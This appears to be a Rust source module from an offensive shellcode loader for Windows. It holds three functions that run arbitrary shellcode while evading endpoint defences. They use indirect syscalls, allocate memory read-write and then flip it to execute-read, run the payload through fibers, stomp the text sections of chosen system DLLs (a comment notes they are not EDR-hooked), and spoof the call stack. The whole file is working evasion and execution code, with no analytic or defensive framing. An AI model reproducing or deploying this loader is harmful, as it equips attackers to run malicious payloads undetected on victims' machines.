#[cfg(target_os = "windows")]
use windows_sys::Win32::System::{
    Threading::{CreateFiber, ConvertThreadToFiber, SwitchToFiber, DeleteFiber},
    Memory::{PAGE_EXECUTE_READ, PAGE_READWRITE},
};

#[cfg(target_os = "windows")]
pub unsafe fn run_no_rwx(shellcode: &[u8]) {
    use crate::evasion::syscalls::get_ssn;
    use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;

    let (ssn_alloc, tramp_alloc) = match get_ssn(b"NtAllocateVirtualMemory") {
        Some(v) => v,
        None => return,
    };
    let mut base_addr: usize = 0;
    let mut region_size: usize = shellcode.len();
    let process_handle: isize = -1isize;

    crate::evasion::syscalls::indirect_syscall(
        ssn_alloc, tramp_alloc,
        process_handle as usize,
        &mut base_addr as *mut usize as usize,
        0,
        &mut region_size as *mut usize as usize,
        0x1000 | 0x2000 | 0x200,
        PAGE_READWRITE as usize,
    );

    let ptr = base_addr as *mut u8;
    core::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr, shellcode.len());

    let (ssn_prot, tramp_prot) = match get_ssn(b"NtProtectVirtualMemory") {
        Some(v) => v,
        None => return,
    };
    let mut old_protect: u32 = 0;
    crate::evasion::syscalls::indirect_syscall(
        ssn_prot, tramp_prot,
        process_handle as usize,
        &mut base_addr as *mut usize as usize,
        &mut region_size as *mut usize as usize,
        PAGE_EXECUTE_READ as usize,
        &mut old_protect as *mut u32 as usize,
        0,
    );

    let main_fiber = ConvertThreadToFiber(core::ptr::null());
    let shell_fiber = CreateFiber(
        0,
        Some(core::mem::transmute(ptr as *const ())),
        core::ptr::null_mut(),
    );
    SwitchToFiber(shell_fiber);
    DeleteFiber(shell_fiber);
    let _ = main_fiber; // suppress unused warning
}

#[cfg(target_os = "windows")]
pub unsafe fn run_stomped(shellcode: &[u8]) -> bool {
    use crate::evasion::module_stomp::stomp_module;

    // Try small, always-present DLLs in order: version < winmm < mpr < wldap32.
    // All have legitimate CFG-registered .text sections; none are EDR-hooked.
    const CANDIDATES: &[&[u8]] = &[
        b"version.dll\0",
        b"winmm.dll\0",
        b"mpr.dll\0",
        b"wldap32.dll\0",
    ];
    for &dll in CANDIDATES {
        if let Some(exec_ptr) = stomp_module(dll, shellcode) {
            let fn_ptr: extern "C" fn() = core::mem::transmute(exec_ptr);
            fn_ptr();
            return true;
        }
    }
    false
}

/// Like run_no_rwx but passes execution through the stack-spoof trampoline.
#[cfg(target_os = "windows")]
pub unsafe fn run_no_rwx_spoof(shellcode: &[u8]) {
    use crate::evasion::syscalls::get_ssn;

    let (ssn_alloc, tramp_alloc) = match get_ssn(b"NtAllocateVirtualMemory") {
        Some(v) => v,
        None => return,
    };
    let mut base_addr: usize = 0;
    let mut region_size: usize = shellcode.len();
    let process_handle: isize = -1isize;

    crate::evasion::syscalls::indirect_syscall(
        ssn_alloc, tramp_alloc,
        process_handle as usize,
        &mut base_addr as *mut usize as usize,
        0,
        &mut region_size as *mut usize as usize,
        0x1000 | 0x2000 | 0x200,
        PAGE_READWRITE as usize,
    );

    let ptr = base_addr as *mut u8;
    core::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr, shellcode.len());

    let (ssn_prot, tramp_prot) = match get_ssn(b"NtProtectVirtualMemory") {
        Some(v) => v,
        None => return,
    };
    let mut old_protect: u32 = 0;
    crate::evasion::syscalls::indirect_syscall(
        ssn_prot, tramp_prot,
        process_handle as usize,
        &mut base_addr as *mut usize as usize,
        &mut region_size as *mut usize as usize,
        PAGE_EXECUTE_READ as usize,
        &mut old_protect as *mut u32 as usize,
        0,
    );

    let fn_ptr: extern "C" fn() = core::mem::transmute(ptr);
    crate::evasion::stack_spoof::spoof_and_call(fn_ptr);
}
